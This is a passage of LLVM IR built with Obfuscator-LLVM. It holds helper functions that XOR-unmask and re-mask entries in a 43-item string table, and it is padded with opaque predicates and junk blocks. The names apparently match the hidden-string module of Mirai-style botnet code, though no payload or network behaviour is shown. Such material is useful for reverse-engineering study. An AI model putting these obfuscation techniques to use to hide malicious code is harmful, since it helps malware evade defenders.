  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

; <label>:83:                                     ; preds = %34
  %84 = load i32, i32* @x.45
  %85 = load i32, i32* @y.46
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %83
  %92 = load i32, i32* %3, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %3, align 4
  %94 = load i32, i32* @x.45
  %95 = load i32, i32* @y.46
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:102:                                    ; preds = %27
  %103 = load i32, i32* @x.45
  %104 = load i32, i32* @y.46
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %102
  %111 = load i32, i32* @x.45
  %112 = load i32, i32* @y.46
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %83
  %119 = load i32, i32* %3, align 4
  %_ = sub i32 %119, 1
  %gen = mul i32 %_, 1
  %_1 = shl i32 %119, 1
  %_2 = shl i32 %119, 1
  %_3 = sub i32 0, %119
  %gen4 = add i32 %_3, 1
  %_5 = shl i32 %119, 1
  %_6 = shl i32 %119, 1
  %120 = add nsw i32 %119, 1
  store i32 %120, i32* %3, align 4
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %102
  br label %originalBB7
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = load i32, i32* @x.47
  %3 = load i32, i32* @y.48
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  %11 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %10, align 1
  %12 = load i8, i8* %10, align 1
  %13 = zext i8 %12 to i64
  %14 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %13
  store %struct.table_value* %14, %struct.table_value** %11, align 8
  %15 = load i8, i8* %10, align 1
  call void @toggle_obf(i8 zeroext %15)
  %16 = load i32, i32* @x.47
  %17 = load i32, i32* @y.48
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %24 = alloca i8, align 1
  %25 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %24, align 1
  %26 = load i8, i8* %24, align 1
  %27 = zext i8 %26 to i64
  %28 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %27
  store %struct.table_value* %28, %struct.table_value** %25, align 8
  %29 = load i8, i8* %24, align 1
  call void @toggle_obf(i8 zeroext %29)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
